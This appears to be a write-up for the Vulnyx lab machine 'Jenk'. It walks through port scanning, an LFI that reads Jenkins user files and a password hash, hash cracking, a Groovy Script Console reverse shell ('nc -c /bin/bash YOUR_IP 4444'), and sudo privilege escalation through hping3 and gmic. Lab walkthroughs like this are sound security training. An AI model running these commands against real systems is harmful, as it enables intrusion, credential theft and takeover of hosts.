---
title: "Jenk - Vulnyx"
summary: "Difficulty: Easy 🟢"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://vulnyx.com/#Jenk)

![0](/images/writeups/jenk/0.png)

> 📝 **NOTE**: Although the machine is listed as **medium** difficulty, I will consider it **easy** because it doesn’t seem complex enough to deserve the medium level.

To begin, we will perform a **quick port scan** with [**Nmap**](https://nmap.org/) to see **which ports are open** on the target machine.

```
sudo nmap -sS --min-rate 4500 -n -Pn -vvv 192.168.1.78
```

![1](/images/writeups/jenk/1.png)

Once we know **which ports are open**, we run a **more detailed scan** on them and save the results to a file.

```
sudo nmap -sCV -p22,80,8080 -n -Pn 192.168.1.78 -oN target
```

![2](/images/writeups/jenk/2.png)

The scan identifies active services on ports **22** (**SSH**), **80** (**Apache**), and **8080** (**Jetty**).

If we **open a browser** and visit port **80**, we are shown the default ***index.html*** page.

![3](/images/writeups/jenk/3.png)

On port **8080**, [**Jenkins**](https://www.jenkins.io/) is running, a program that helps developers by doing repetitive work for them.
It can build the code, test it, and deploy it automatically so humans don’t have to press buttons all day.

![4](/images/writeups/jenk/4.png)

For now we set **Jenkins** aside since we don’t have any credentials.

Next, we look for **hidden directories** using [**WFUZZ**](https://github.com/xmendez/wfuzz) on the port **80** web service.

```
wfuzz -c --hw=31,933 -u http://192.168.1.78/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![5](/images/writeups/jenk/5.png)

We find an interesting directory named ***webcams***. When we open it, **it shows a list of cameras**.

![6](/images/writeups/jenk/6.png)

Clicking the links opens different **XML files** with the corresponding information for each camera.

![7](/images/writeups/jenk/7.png)

![8](/images/writeups/jenk/8.png)

If we try to load ***/etc/passwd*** from that parameter, **the server reads the file but fails to process it as XML** and displays an error.

![9](/images/writeups/jenk/9.png)

Since we have an **LFI**, we can try reading **Jenkins XML files** that might help us move forward.

```
http://192.168.1.78/webcams/includecam.php?cam=/var/lib/jenkins/users/users
```

![10](/images/writeups/jenk/10.png)

If we press **Ctrl + U** to view the **source code**, we see the **XML contents**.

![11](/images/writeups/jenk/11.png)

We obtain the **name** + **internal ID** of a **Jenkins user** named **andrew**. If we open his folder, we find all his information, including **the hash of his password**.

```
http://192.168.1.78/webcams/includecam.php?cam=/var/lib/jenkins/users/andrew_15328478385288074167/config
```

![12](/images/writeups/jenk/12.png)

We copy the **hash** and save it to a file, and then we use **John the Ripper** to crack the **bcrypt hash**.

```
john -w=/usr/share/wordlists/rockyou.txt hash
```

![13](/images/writeups/jenk/13.png)

Once we know the **credentials** of the only existing **Jenkins** user, we head to the login page on port **8080** and log in.

![14](/images/writeups/jenk/14.png)

Inside the website, there is a simple way to get **RCE** through **Jenkins Scripts**.
To do this, go to **`Manage Jenkins`** > **`Script Console`**.

![15](/images/writeups/jenk/15.png)

We can **execute commands** using the following script:

```groovy
def cmd = "id"
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout"
println "err> $serr"
```

![16](/images/writeups/jenk/16.png)

To access the victim machine, we will listen on a port (**4444**) using [**Netcat**](https://nmap.org/ncat/):

```
nc -lvnp 4444
```

And send the following **Reverse Shell**:

```groovy
def cmd = "nc -c /bin/bash YOUR_IP 4444"
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout"
println "err> $serr"
```

And now **we are inside**.

![17](/images/writeups/jenk/17.png)


## Privilege escalation to Andrew

If we list permissions with **`sudo -l`**, we see **which commands our user can run with elevated privileges** and under which conditions. Here we discover that we can run **hping3** as andrew without a password.

![17.5](/images/writeups/jenk/17.5.png)

Checking [**GTFObins**](https://gtfobins.github.io/), we confirm that this tool can be abused for **privilege escalation** to become **andrew**.

![18](/images/writeups/jenk/18.png)

```
sudo -u andrew /usr/sbin/hping3
```

![19](/images/writeups/jenk/19.png)

And we obtain the **User Flag**.


## Privilege escalation to Root

If we list **sudo permissions** again, but this time as user **andrew**, we see that we can run the **gmic** binary as **root** without providing a password.
Reading the [**manual for gmic**](https://manpages.debian.org/testing/gmic/gmic.1.en.html), we find a **parameter** that **allows command execution**.

![20](/images/writeups/jenk/20.png)

We simply launch a **shell** to become **root**:

```
sudo /usr/bin/gmic x "/bin/bash"
```

![21](/images/writeups/jenk/21.png)

Finally, we obtain the **Root Flag** and **complete the machine**.
